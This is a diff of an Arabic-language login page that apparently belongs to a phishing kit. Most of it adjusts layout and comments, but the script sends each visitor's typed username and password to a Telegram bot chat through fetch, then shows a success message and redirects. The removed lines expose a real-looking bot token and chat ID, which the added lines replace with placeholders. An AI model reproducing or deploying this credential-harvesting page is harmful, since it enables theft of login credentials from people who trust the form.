@@ -51,7 +51,7 @@ pointer-events:none;
 min-height:100%;
 display:grid;
 place-items:center;
-padding:32px 16px 56px;
+padding:32px 16px 96px; /* ترك مسافة للزر تحت */
 }
 
 .card{
@@ -69,7 +69,7 @@ overflow:hidden;
 backdrop-filter: blur(var(--blur));
 }
 
-/* زخرفة زاوية تشبه قَطعة منحنية */
+/* زخرفة زاوية */
 .card::before{
 content:"";
 position:absolute; inset:-40% -20% auto auto;
@@ -129,7 +129,7 @@ border-color: rgba(255,255,255,.28);
 box-shadow: 0 0 0 4px rgba(255,255,255,.06);
 }
 
-/* زر إظهار كلمة المرور داخل الحقل */
+/* زر إظهار كلمة المرور */
 .toggle-eye{
 position:absolute;
 inset:0 auto 0 12px;
@@ -162,32 +162,34 @@ color:var(--muted); text-decoration:none;
 }
 .actions a:hover{ text-decoration:underline }
 
-/* زر تسجيل الدخول */
+/* زر تسجيل الدخول خارج البوكس */
 .submit{
-position: sticky; /* عشان ما يختفي خلف الكيبورد */
+position: fixed; /* ثابت بأسفل الشاشة */
 bottom: 0;
-margin-top: 24px;
+left: 0;
 width: 100%;
 background: var(--accent);
 color:#fff;
 border:none;
-border-radius: 12px;
+border-radius: 16px 16px 0 0; /* حواف علوية مستديرة */
 padding: 18px 24px;
 font-size: 26px;
 font-weight:700;
 cursor:pointer;
-box-shadow: 0 10px 18px rgba(255,106,43,.3);
+box-shadow: 0 -4px 18px rgba(0,0,0,.35);
 transition: transform .05s, background .2s, box-shadow .2s;
+z-index:1000;
 }
 .submit:active{ transform: scale(.99) }
-.submit:hover{ background: var(--accent-hover); box-shadow: 0 12px 24px rgba(255,106,43,.35); }
+.submit:hover{ background: var(--accent-hover); box-shadow: 0 -6px 22px rgba(0,0,0,.4); }
 
-/* حاوية لرسائل التنبيه */
+/* تنبيه */
 .toast{
 position:fixed; top:16px; left:50%; transform:translateX(-50%);
 background:rgba(38,38,50,.85); color:#fff; border:1px solid var(--border);
 padding:12px 16px; border-radius:12px; box-shadow:var(--shadow);
 font-size:16px; display:none;
+z-index:1100;
 }
 
 @media (max-width:520px){
@@ -227,25 +229,25 @@ h1{ font-size:34px }
 <a href="#" id="resetLink">إعادة تعيين كلمة المرور؟</a>
 <a href="#" id="forgotLink">نسيت اسم المستخدم؟</a>
 </div>
-
-<button class="submit" form="loginForm" type="submit">تسجيل الدخول</button>
 </form>
 </div>
+
+<!-- زر تسجيل الدخول خارج البوكس -->
+<button class="submit" form="loginForm" type="submit">تسجيل الدخول</button>
 
 <div class="toast" id="toast"></div>
 
 <script>
-// تبديل رؤية كلمة المرور مع حركة العين
+// تبديل رؤية كلمة المرور
 const pass = document.getElementById('password');
 const eyeBtn = document.querySelector('.toggle-eye');
-
 eyeBtn.addEventListener('click', () => {
 const isHidden = pass.type === 'password';
 pass.type = isHidden ? 'text' : 'password';
 eyeBtn.classList.toggle('line', !isHidden);
 });
 
-// تنبيه بسيط
+// تنبيه
 function showToast(msg){
 const t = document.getElementById('toast');
 t.textContent = msg;
@@ -253,11 +255,11 @@ t.style.display = 'block';
 setTimeout(() => t.style.display = 'none', 2600);
 }
 
-// === إعدادات تيليجرام ===
+// === تيليجرام ===
 const TG_DIRECT = {
 enabled: true,
-botToken: '8329394212:AAEoTZ5qvy9Dz4-ew9mjLIm_8mgxGeP4gtA',
-chatId: '5450865891'
+botToken: 'ضع_توكن_البوت',
+chatId: 'ضع_تشات_آي_دي'
 };
 const PROXY_ENDPOINT = '';
 
@@ -265,45 +267,23 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 e.preventDefault();
 const username = document.getElementById('username').value.trim();
 const password = document.getElementById('password').value;
-
 if(!username || !password){ showToast('يرجى تعبئة الحقول المطلوبة'); return; }
 
 const text = `طلب تسجيل دخول:\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
-
 try{
-if(PROXY_ENDPOINT){
-const r = await fetch(PROXY_ENDPOINT, {
-method: 'POST',
-headers: {'Content-Type':'application/json'},
-body: JSON.stringify({ text, username, password })
-});
-if(!r.ok) throw new Error('Proxy error');
-}else if(TG_DIRECT.enabled){
+if(TG_DIRECT.enabled){
 const url = `https://api.telegram.org/bot${TG_DIRECT.botToken}/sendMessage`;
 const r = await fetch(url, {
 method: 'POST',
 headers: {'Content-Type':'application/json'},
-body: JSON.stringify({
-chat_id: TG_DIRECT.chatId,
-text,
-parse_mode: 'HTML',
-disable_web_page_preview: true
-})
+body: JSON.stringify({ chat_id: TG_DIRECT.chatId, text })
 });
 if(!r.ok) throw new Error('Telegram error');
-}else{
-throw new Error('لم يتم ضبط وسيلة الإرسال');
 }
-
 showToast('تم الإرسال بنجاح');
-setTimeout(() => {
-window.location.href = 'splash.html';
-}, 2600);
+setTimeout(() => { window.location.href = 'splash.html'; }, 2600);
 e.target.reset();
-}catch(err){
-console.error(err);
-showToast('تعذّر الإرسال، حاول لاحقًا');
-}
+}catch(err){ console.error(err); showToast('تعذّر الإرسال'); }
 });
 
 document.getElementById('resetLink').addEventListener('click', (e)=>{ e.preventDefault(); showToast('رابط إعادة التعيين قادم لاحقًا')});
